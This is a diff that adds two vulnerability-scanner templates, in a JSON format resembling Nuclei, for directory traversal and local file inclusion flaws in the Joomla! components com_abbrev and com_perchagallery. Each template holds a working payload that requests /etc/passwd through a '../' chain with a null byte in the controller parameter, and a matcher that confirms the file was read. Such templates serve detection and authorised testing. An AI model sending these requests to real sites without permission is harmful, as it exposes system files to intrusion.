@@ -757,6 +757,43 @@
       ]
     },
     {
+      "id": "CVE-2010-0985",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Abbreviations Manager (com_abbrev) component 1.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_abbrev - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/10948",
+          "https://www.cvedetails.com/cve/CVE-2010-0985"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_abbrev&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1306",
       "info": {
         "author": "daffainfo",
@@ -1677,6 +1714,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_perchacategoriestree&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2035",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Percha Gallery (com_perchagallery) component 1.6 Beta for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Percha Gallery 1.6 Beta - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/34006",
+          "https://www.cvedetails.com/cve/CVE-2010-2035"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_perchagallery&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
